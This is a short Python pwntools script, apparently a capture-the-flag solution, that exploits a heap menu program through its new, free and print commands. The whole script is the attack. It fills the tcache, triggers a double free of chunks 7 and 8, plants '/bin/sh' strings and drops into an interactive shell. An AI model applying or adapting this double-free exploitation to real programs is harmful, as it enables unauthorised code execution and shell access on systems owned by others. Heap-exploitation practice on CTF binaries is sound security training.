from pwn import *
import sys

context.binary = sys.argv[1]
p = process(context.binary.path)
#p = remote("127.0.0.1", 1339)
context.arch = 'amd64'

def alloc(size, data):
    p.send(b'new\x00\x00\x00')     
    p.send(p64(size))              
    p.send(data.ljust(size, b'\x00'))
    print(p.recvuntil(b'not good'))

def free(index):
    p.send(b'frgt\x00\x00')        
    p.send(p64(index))             
    print(p.recvuntil(b'not good'))

def view(index):
    p.send(b'print\x00')           
    p.send(p64(index))             
    print(p.recvuntil(b'not good'))

for i in range(7):
    alloc(8, b'K'*8)

for i in range(7):
    free(i)

alloc(8, b'A'*8)  #?
alloc(8, b'B'*8)  # slot 9

free(7)
free(8)
free(7)

alloc(8, b'/bin/sh\0')
alloc(8, b'0'*8)

#gdb.attach(p)

p.send(b'exit\x00\x00')
p.send(p64(0))

for i in range(16):
    p.send('/bin/sh\0')

p.interactive()
